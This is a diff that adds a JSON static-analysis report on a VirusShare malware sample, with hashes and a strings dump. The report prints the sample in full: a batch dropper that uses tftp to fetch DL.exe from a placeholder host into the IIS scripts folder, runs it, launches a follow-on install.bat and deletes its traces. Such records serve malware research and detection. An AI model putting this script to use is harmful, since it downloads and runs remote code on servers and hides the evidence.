@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "@echo off\ncd \\Inetpub\\scripts\nstartDL:\ntftp.exe -i a.b.c.d get DL.exe\nif not exist DL.exe goto startDL\nstart /w DL.exe\nren 00.D install.bat\nattrib TFTP* -r\nattrib DL.exe -r\ndel TFTP*\ndel DL.exe\ninstall.bat %1\nexit"
+    },
+    "filename": "VirusShare_8ce94bd50921762527da7903b0c61f47",
+    "filesize": 227,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "8ce94bd50921762527da7903b0c61f47",
+        "sha1": "5342c6d56f496237967e510d7e956a89a05d0c58",
+        "sha256": "613feb1bff403e3520fe9eb058eb31bb4c9a053a0c3d67d6f6c9d2d665ddaffb"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "cd \\Inetpub\\scripts",
+            "startDL:",
+            "tftp.exe -i a.b.c.d get DL.exe",
+            "if not exist DL.exe goto startDL",
+            "start /w DL.exe",
+            "ren 00.D install.bat",
+            "attrib TFTP* -r",
+            "attrib DL.exe -r",
+            "del TFTP*",
+            "del DL.exe",
+            "install.bat %1",
+            "exit"
+        ],
+        "file": {
+            "del DL.exe": "Executable",
+            "start /w DL.exe": "Executable",
+            "tftp.exe -i a.b.c.d get DL.exe": "Executable"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:01.184248",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
